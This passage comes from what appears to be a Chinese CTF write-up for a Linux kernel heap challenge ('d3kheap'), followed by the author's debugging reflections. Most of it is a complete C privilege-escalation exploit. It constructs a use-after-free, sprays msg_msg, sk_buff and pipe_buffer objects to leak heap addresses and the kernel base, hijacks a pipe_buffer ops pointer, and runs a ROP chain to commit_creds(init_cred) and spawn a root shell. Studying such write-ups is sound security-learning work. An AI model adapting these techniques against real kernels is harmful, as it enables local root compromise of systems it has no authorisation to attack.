class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">freeSkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="keyword">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="keyword">int</span>         rop_idx;</span><br><span class="line">    <span class="keyword">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a free object</span></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1024</span>)</span><br><span class="line">            del();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger UAF...&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to mark the UAF msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find out the UAF queue</span></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * the msg_msg got changed, so we can&#x27;t read out</span></span><br><span class="line"><span class="comment">         * but it tells us which one the victim is</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg*)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (struct msg_msg*) &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, victim_addr, victim_addr, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;yhellow&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, kernel_base, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for gdb attach only</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>太菜了，只能对着别人的 wp 进行调试，不过还是学到了不少东西：</p>
<ul>
<li><code>msg_msg</code>，<code>sk_buff</code> 的组合利用</li>
<li>两种关于 <code>msg_msg</code> 的泄露技巧（修改 <code>msg_msg-&gt;m_ts</code> 或者 <code>msg_msg-&gt;next</code>）</li>
<li>利用 <code>pipe_buffer</code> 泄露内核基地址，或者劫持RIP</li>
</ul>
<p><strong>补充：</strong></p>
<p>我仿照官方 exp 又自己打了一边，发现了许多之前没有理解的细节问题（改BUG真辛苦），接下来补充一些内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">peekMsg(msqid[i],&amp;secondary_msg,<span class="keyword">sizeof</span>(secondary_msg),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个 <code>peekMsg</code> 因为修改了 <code>msg-&gt;m_ts</code> 而报错</li>
<li>第二个 <code>peekMsg</code> 也修改了 <code>msg-&gt;m_ts</code> 但是没有报错</li>
</ul>
<p>刚开始以为是：</p>
<ul>
<li><code>msg-&gt;m_ts</code> 大于 <code>sizeof(secondary_msg)</code> 导致 <code>secondary_msg</code> 溢出，而后续的 <code>sizeof(oob_msg)</code> 足够大，不会溢出</li>
</ul>
<p>后来又发现了新的内容：</p>
<ul>
<li>这里修改了 <code>msg-&gt;m_list</code> 也是有影响的：<ul>
<li>设置了 <code>MSG_COPY</code> 标志位，内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
<li>如果没有设置 <code>MSG_COPY</code>，则我们随便设置的 <code>msg-&gt;m_list</code> 一定会在 unlink 时报错</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">peekMsg(msqid[i],&amp;secondary_msg,<span class="keyword">sizeof</span>(secondary_msg),<span class="number">1</span>);</span><br><span class="line">peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg),<span class="number">1</span>);</span><br><span class="line">readMsg(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE);</span><br></pre></td></tr></table></figure>
<p>之前提到过：<code>msgtyp &gt; 0</code> ，返回队列中消息类型为 <code>msgtyp</code> 的消息：</p>
<ul>
<li><code>readMsg</code> 使用 <code>VICTIM_MSG_TYPE</code> 来获取对应的 UAF（遵守了这样的规则）</li>
<li><code>peekMsg</code> 使用的 <code>msgtyp</code> 都是“1”（并且非“1”不可）</li>
<li>这里还有点搞不懂，首先我把接收的数据打印出来，确定了 <code>msgtyp</code> 的确是 <code>SECONDARY_MSG_TYPE</code>，但把 <code>msgtyp</code> 改为 <code>SECONDARY_MSG_TYPE</code> 后反而接收不了数据了，然后我尝试修改 <code>SECONDARY_MSG_TYPE</code> 的值，发现并不影响结果，我感觉这是内核版本的问题（之后找机会看看源码）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spraySkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span 